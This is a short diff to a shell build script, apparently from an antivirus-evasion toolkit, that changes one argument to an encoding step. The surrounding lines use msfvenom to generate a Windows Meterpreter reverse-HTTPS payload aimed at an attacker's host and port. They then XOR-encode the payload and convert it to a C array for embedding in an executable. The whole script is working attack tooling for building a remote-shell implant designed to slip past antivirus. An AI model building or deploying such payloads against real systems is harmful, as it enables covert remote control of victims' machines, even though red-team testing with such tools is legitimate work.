@@ -20,7 +20,7 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt
 
 # Apply AVET encoding
-encode_shellcode input/sc_c.txt input/scenc_raw.txt
+encode_shellcode avet input/sc_c.txt input/scenc_raw.txt
 
 # convert to c array format for static include
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
